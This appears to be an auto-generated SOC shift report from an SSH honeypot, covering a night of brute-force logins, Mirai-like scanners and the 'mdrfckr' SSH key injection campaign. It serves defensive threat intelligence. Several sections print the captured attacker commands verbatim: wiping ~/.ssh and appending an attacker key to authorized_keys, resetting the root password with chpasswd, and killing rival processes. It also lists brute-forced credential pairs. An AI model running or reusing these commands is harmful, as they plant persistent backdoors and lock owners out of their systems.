# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-03 |
| **Generated At** | 2026-04-03T05:42:05Z |
| **Shift Time** | 05:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **81** |
| Confirmed Threats | **66** |
| False Positives Filtered | **15** (18.5%) |
| Unique Attacker IPs | **58** |
| Countries of Origin | **24** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **74** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **43** |
| Unique Credential Pairs | **38** |
| Unique Usernames | **25** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 7 |
| `345gs5662d34` | 3 |
| `mysql` | 3 |
| `Blank` | 2 |
| `debian` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `Host: 13.235.92.17:23` | 2 |
| `0987654321` | 2 |
| `qwerty12` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `Blank` | `123654` | 1 |
| `Unknown` | `123456` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Pe123456` | `101.126.81.18` | 2026-04-03T02:17:15 |
| `root` | `cardinals` | `46.29.238.171` | 2026-04-03T02:17:24 |
| `root` | `3245gs5662d34` | `46.29.238.171` | 2026-04-03T02:17:33 |
| `root` | `root@` | `69.74.29.21` | 2026-04-03T02:21:20 |
| `root` | `3245gs5662d34` | `69.74.29.21` | 2026-04-03T02:21:26 |
| `root` | `zxcZXC123` | `81.30.162.19` | 2026-04-03T03:30:02 |
| `root` | `3245gs5662d34` | `81.30.162.19` | 2026-04-03T03:30:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **81** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 29 |
| libssh | 19 |
| Go SSH scanner | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 29 | 29 |
| `03a80b21afa8...` | Modern SSH client | 14 | 6 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `17a5327c6d98...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 29 | 29 | Mirai/variant |
| `03a80b21afa8...` | libssh | 14 | 6 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 3 | — |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `17a5327c6d98...` | Go SSH scanner | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Gsily9nzGFvA"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.81.18`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `69.74.29.21`, `46.29.238.171`, `81.30.162.19`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **58** |
| Unique ASNs | **42** |
| High-Risk ASNs | **36** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS400992` | ZhouyiSat Communications | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-111b3533e2ad

| Field | Detail |
|---|---|
| **Source IP** | `101.126.81[.]18` |
| **First Seen** | 2026-04-03 02:17 |
| **Last Seen** | 2026-04-03 02:17 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Gsily9nzGFvA"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 02:17:13` | `cowrie.session.connect` |
| `2026-04-03 02:17:13` | `cowrie.client.version` |
| `2026-04-03 02:17:14` | `cowrie.client.kex` |
| `2026-04-03 02:17:15` | `cowrie.login.success` |
| `2026-04-03 02:17:15` | `cowrie.session.params` |
| `2026-04-03 02:17:15` | `cowrie.command.input` |
| `2026-04-03 02:17:15` | `cowrie.command.failed` |
| `2026-04-03 02:17:15` | `cowrie.log.closed` |
| `2026-04-03 02:17:15` | `cowrie.session.params` |
| `2026-04-03 02:17:15` | `cowrie.command.input` |
| `2026-04-03 02:17:16` | `cowrie.session.file_download` |
| `2026-04-03 02:17:16` | `cowrie.log.closed` |
| `2026-04-03 02:17:32` | `cowrie.session.params` |
| `2026-04-03 02:17:32` | `cowrie.command.input` |
| `2026-04-03 02:17:33` | `cowrie.log.closed` |
| `2026-04-03 02:17:33` | `cowrie.session.params` |
| `2026-04-03 02:17:33` | `cowrie.command.input` |
| `2026-04-03 02:17:33` | `cowrie.log.closed` |
| `2026-04-03 02:17:34` | `cowrie.session.params` |
| `2026-04-03 02:17:34` | `cowrie.command.input` |
| `2026-04-03 02:17:34` | `cowrie.session.file_download` |
| `2026-04-03 02:17:34` | `cowrie.log.closed` |
| `2026-04-03 02:17:35` | `cowrie.session.params` |
| `2026-04-03 02:17:35` | `cowrie.command.input` |
| `2026-04-03 02:17:35` | `cowrie.log.closed` |
| `2026-04-03 02:17:35` | `cowrie.session.params` |
| `2026-04-03 02:17:35` | `cowrie.command.input` |
| `2026-04-03 02:17:35` | `cowrie.log.closed` |
| `2026-04-03 02:17:36` | `cowrie.session.params` |
| `2026-04-03 02:17:36` | `cowrie.command.input` |
| `2026-04-03 02:17:36` | `cowrie.command.input` |
| `2026-04-03 02:17:36` | `cowrie.log.closed` |
| `2026-04-03 02:17:36` | `cowrie.session.params` |
| `2026-04-03 02:17:36` | `cowrie.command.input` |
| `2026-04-03 02:17:37` | `cowrie.log.closed` |
| `2026-04-03 02:17:37` | `cowrie.session.params` |
| `2026-04-03 02:17:37` | `cowrie.command.input` |
| `2026-04-03 02:17:38` | `cowrie.log.closed` |
| `2026-04-03 02:17:38` | `cowrie.session.params` |
| `2026-04-03 02:17:38` | `cowrie.command.input` |
| `2026-04-03 02:17:38` | `cowrie.log.closed` |
| `2026-04-03 02:17:38` | `cowrie.session.params` |
| `2026-04-03 02:17:38` | `cowrie.command.input` |
| `2026-04-03 02:17:39` | `cowrie.log.closed` |
| `2026-04-03 02:17:39` | `cowrie.session.params` |
| `2026-04-03 02:17:39` | `cowrie.command.input` |
| `2026-04-03 02:17:39` | `cowrie.log.closed` |
| `2026-04-03 02:17:40` | `cowrie.session.params` |
| `2026-04-03 02:17:40` | `cowrie.command.input` |
| `2026-04-03 02:17:40` | `cowrie.log.closed` |
| `2026-04-03 02:17:40` | `cowrie.session.params` |
| `2026-04-03 02:17:40` | `cowrie.command.input` |
| `2026-04-03 02:17:41` | `cowrie.log.closed` |
| `2026-04-03 02:17:41` | `cowrie.session.params` |
| `2026-04-03 02:17:41` | `cowrie.command.input` |
| `2026-04-03 02:17:41` | `cowrie.log.closed` |
| `2026-04-03 02:17:41` | `cowrie.session.params` |
| `2026-04-03 02:17:41` | `cowrie.command.input` |
| `2026-04-03 02:17:42` | `cowrie.log.closed` |
| `2026-04-03 02:17:42` | `cowrie.session.params` |
| `2026-04-03 02:17:42` | `cowrie.command.input` |
| `2026-04-03 02:17:42` | `cowrie.log.closed` |
| `2026-04-03 02:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.81[.]18` to AbuseIPDB if not already reported
- [ ] Block `101.126.81[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b36a193e7e

| Field | Detail |
|---|---|
| **Source IP** | `46.29.238[.]171` |
| **First Seen** | 2026-04-03 02:17 |
| **Last Seen** | 2026-04-03 02:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 02:17:23` | `cowrie.session.connect` |
| `2026-04-03 02:17:23` | `cowrie.client.version` |
| `2026-04-03 02:17:24` | `cowrie.client.kex` |
| `2026-04-03 02:17:24` | `cowrie.login.success` |
| `2026-04-03 02:17:25` | `cowrie.session.params` |
| `2026-04-03 02:17:25` | `cowrie.command.input` |
| `2026-04-03 02:17:25` | `cowrie.command.failed` |
| `2026-04-03 02:17:25` | `cowrie.log.closed` |
| `2026-04-03 02:17:25` | `cowrie.session.params` |
| `2026-04-03 02:17:25` | `cowrie.command.input` |
| `2026-04-03 02:17:26` | `cowrie.session.file_download` |
| `2026-04-03 02:17:26` | `cowrie.log.closed` |
| `2026-04-03 02:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.29.238[.]171` to AbuseIPDB if not already reported
- [ ] Block `46.29.238[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7abfdb9afd0a

| Field | Detail |
|---|---|
| **Source IP** | `46.29.238[.]171` |
| **First Seen** | 2026-04-03 02:17 |
| **Last Seen** | 2026-04-03 02:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 02:17:32` | `cowrie.session.connect` |
| `2026-04-03 02:17:32` | `cowrie.client.version` |
| `2026-04-03 02:17:32` | `cowrie.client.kex` |
| `2026-04-03 02:17:33` | `cowrie.login.success` |
| `2026-04-03 02:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.29.238[.]171` to AbuseIPDB if not already reported
- [ ] Block `46.29.238[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb61a34f50c1

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-04-03 02:21 |
| **Last Seen** | 2026-04-03 02:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 02:21:19` | `cowrie.session.connect` |
| `2026-04-03 02:21:19` | `cowrie.client.version` |
| `2026-04-03 02:21:19` | `cowrie.client.kex` |
| `2026-04-03 02:21:20` | `cowrie.login.success` |
| `2026-04-03 02:21:21` | `cowrie.session.params` |
| `2026-04-03 02:21:21` | `cowrie.command.input` |
| `2026-04-03 02:21:21` | `cowrie.command.failed` |
| `2026-04-03 02:21:21` | `cowrie.log.closed` |
| `2026-04-03 02:21:22` | `cowrie.session.params` |
| `2026-04-03 02:21:22` | `cowrie.command.input` |
| `2026-04-03 02:21:22` | `cowrie.session.file_download` |
| `2026-04-03 02:21:22` | `cowrie.log.closed` |
| `2026-04-03 02:21:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbae05ba01c6

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-04-03 02:21 |
| **Last Seen** | 2026-04-03 02:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 02:21:25` | `cowrie.session.connect` |
| `2026-04-03 02:21:25` | `cowrie.client.version` |
| `2026-04-03 02:21:25` | `cowrie.client.kex` |
| `2026-04-03 02:21:26` | `cowrie.login.success` |
| `2026-04-03 02:21:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8684acc6b9e

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-03 03:30 |
| **Last Seen** | 2026-04-03 03:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 03:30:01` | `cowrie.session.connect` |
| `2026-04-03 03:30:01` | `cowrie.client.version` |
| `2026-04-03 03:30:01` | `cowrie.client.kex` |
| `2026-04-03 03:30:02` | `cowrie.login.success` |
| `2026-04-03 03:30:02` | `cowrie.session.params` |
| `2026-04-03 03:30:02` | `cowrie.command.input` |
| `2026-04-03 03:30:02` | `cowrie.command.failed` |
| `2026-04-03 03:30:02` | `cowrie.log.closed` |
| `2026-04-03 03:30:03` | `cowrie.session.params` |
| `2026-04-03 03:30:03` | `cowrie.command.input` |
| `2026-04-03 03:30:03` | `cowrie.session.file_download` |
| `2026-04-03 03:30:03` | `cowrie.log.closed` |
| `2026-04-03 03:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be57ba48bebd

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-03 03:30 |
| **Last Seen** | 2026-04-03 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 03:30:05` | `cowrie.session.connect` |
| `2026-04-03 03:30:05` | `cowrie.client.version` |
| `2026-04-03 03:30:05` | `cowrie.client.kex` |
| `2026-04-03 03:30:06` | `cowrie.login.success` |
| `2026-04-03 03:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `23.172.217[.]58` | **7** | 2026-04-03 04:32 | 2026-04-03 04:32 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `18.116.101[.]220` | **6** | 2026-04-03 03:45 | 2026-04-03 03:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.81[.]18` | **2** | 2026-04-03 02:17 | 2026-04-03 02:19 | 4m | 0 | `T1592` | 🟢 LOW |
| `150.246.249[.]149` | **2** | 2026-04-03 03:02 | 2026-04-03 03:39 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.13.4[.]124` | 1 | 2026-04-03 02:41 | 2026-04-03 02:41 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.211.7[.]162` | 1 | 2026-04-03 04:55 | 2026-04-03 04:56 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.86.52[.]218` | 1 | 2026-04-03 05:37 | 2026-04-03 05:37 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.155.27[.]128` | 1 | 2026-04-03 03:20 | 2026-04-03 03:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.200.229[.]33` | 1 | 2026-04-03 04:03 | 2026-04-03 04:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.36.178[.]14` | 1 | 2026-04-03 04:18 | 2026-04-03 04:18 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.78.9[.]93` | 1 | 2026-04-03 04:56 | 2026-04-03 04:56 | 30s | 0 | `T1592` | 🟢 LOW |
| `121.202.146[.]144` | 1 | 2026-04-03 03:47 | 2026-04-03 03:47 | 17s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.52.202[.]92` | 1 | 2026-04-03 04:26 | 2026-04-03 04:26 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.39.93[.]73` | 1 | 2026-04-03 02:22 | 2026-04-03 02:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.99.61[.]248` | 1 | 2026-04-03 05:25 | 2026-04-03 05:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `146.255.228[.]189` | 1 | 2026-04-03 03:27 | 2026-04-03 03:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.222[.]56` | 1 | 2026-04-03 03:04 | 2026-04-03 03:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.253.72[.]162` | 1 | 2026-04-03 03:24 | 2026-04-03 03:24 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.131.168[.]114` | 1 | 2026-04-03 03:23 | 2026-04-03 03:23 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.188.253[.]150` | 1 | 2026-04-03 02:08 | 2026-04-03 02:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `181.114.143[.]79` | 1 | 2026-04-03 05:03 | 2026-04-03 05:03 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.148.187[.]172` | 1 | 2026-04-03 05:33 | 2026-04-03 05:33 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.235.193[.]170` | 1 | 2026-04-03 02:21 | 2026-04-03 02:21 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.182.73[.]132` | 1 | 2026-04-03 02:05 | 2026-04-03 02:05 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.220.156[.]232` | 1 | 2026-04-03 04:43 | 2026-04-03 04:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.150.37[.]249` | 1 | 2026-04-03 04:43 | 2026-04-03 04:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.120.176[.]6` | 1 | 2026-04-03 05:18 | 2026-04-03 05:18 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.180.2[.]62` | 1 | 2026-04-03 04:23 | 2026-04-03 04:23 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.186.24[.]146` | 1 | 2026-04-03 05:12 | 2026-04-03 05:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.123.98[.]26` | 1 | 2026-04-03 04:38 | 2026-04-03 04:38 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.138.202[.]60` | 1 | 2026-04-03 05:38 | 2026-04-03 05:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.29.238[.]171` | 1 | 2026-04-03 02:17 | 2026-04-03 02:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.148[.]185` | 1 | 2026-04-03 03:59 | 2026-04-03 03:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]52` | 1 | 2026-04-03 04:46 | 2026-04-03 04:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]41` | 1 | 2026-04-03 04:06 | 2026-04-03 04:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.17.128[.]7` | 1 | 2026-04-03 05:14 | 2026-04-03 05:14 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.233.4[.]50` | 1 | 2026-04-03 02:28 | 2026-04-03 02:28 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `64.72.74[.]162` | 1 | 2026-04-03 02:47 | 2026-04-03 02:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `69.74.29[.]21` | 1 | 2026-04-03 02:21 | 2026-04-03 02:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
